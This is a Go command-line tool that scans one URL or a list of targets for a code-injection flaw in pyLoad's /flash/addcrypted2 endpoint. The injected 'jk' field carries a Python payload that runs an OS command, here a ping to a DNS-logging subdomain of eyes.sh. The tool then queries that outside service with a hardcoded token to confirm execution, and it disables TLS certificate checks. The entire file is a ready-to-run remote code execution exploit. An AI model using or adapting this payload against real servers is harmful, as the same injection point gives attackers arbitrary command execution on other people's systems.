package main

import (
	"crypto/tls"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"strings"
	"time"
)

func readFile(fileName string) ([]string, error) {
	fileObj, err := ioutil.ReadFile(fileName)
	if err != nil {
		fmt.Println("open file failed, err:", err)
		return nil, err
	}

	lines := strings.Split(string(fileObj), "\n")

	for i, line := range lines {
		lines[i] = strings.TrimSuffix(line, "\r")
	}
	return lines, nil
}

func urlHandler(target string) string {
	if !strings.HasPrefix(target, "http") {
		target = "http://" + target
	}

	url, err := url.Parse(target)
	if err != nil {
		fmt.Println(err)
	}
	url.Path = ""
	target = url.String()

	return target
}

func vuln_Verify(target string) {
	rand.Seed(time.Now().UnixNano())
	b := make([]byte, 2)
	rand.Read(b)
	rand_str := hex.EncodeToString(b)

	url := target + "/flash/addcrypted2"
	postDataStr := `jk=pyimport%20os;os.system("ping ` + rand_str + `.pyload.eyes.sh -c4");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa`

	req, err := http.NewRequest(http.MethodPost, url, strings.NewReader(postDataStr))
	if err != nil {
		fmt.Println("Create POST request failed", err.Error())
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := http.Client{
		Transport: tr,
		Timeout:   10 * time.Second,
	}

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("request target fail", err.Error())
		return
	}
	defer resp.Body.Close()

	<-time.After(5 * time.Second)

	dnsResponseGet, err := http.Get("http://eyes.sh/api/dns/pyload/" + rand_str + "/?token=0b899490")
	if err != nil {
		fmt.Println("Failed to create dnsResponseGet request", err.Error())
		return
	}

	body, err := ioutil.ReadAll(dnsResponseGet.Body)

	if err != nil {
		fmt.Println("Failed to get response\n", err.Error())
		return
	}

	dnsResponseGet.Body.Close()

	if string(body) == "True" {
		fmt.Printf("%v:Target is vulnerable.\n", target)
	} else if string(body) == "False" {
		fmt.Printf("%v:The target is not vulnerable.\n", target)
	}
}

func main() {
	var target, fileName string
	flag.StringVar(&target, "u", "", "example:http://127.0.0.1:8080")
	flag.StringVar(&fileName, "f", "", "fileName:test.txt")
	flag.Parse()

	if target == "" && fileName == "" {
		fmt.Println("-h 查看使用方法,-u和-f两个参数同一时间只能用一个。")
		return
	}

	if target == "" {
		lines, err := readFile(fileName)
		if err != nil {
			fmt.Println(err)
		}

		for _, v := range lines {
			target = urlHandler(v)
			vuln_Verify(target)
		}
	} else {
		target = urlHandler(target)
		vuln_Verify(target)
	}
}
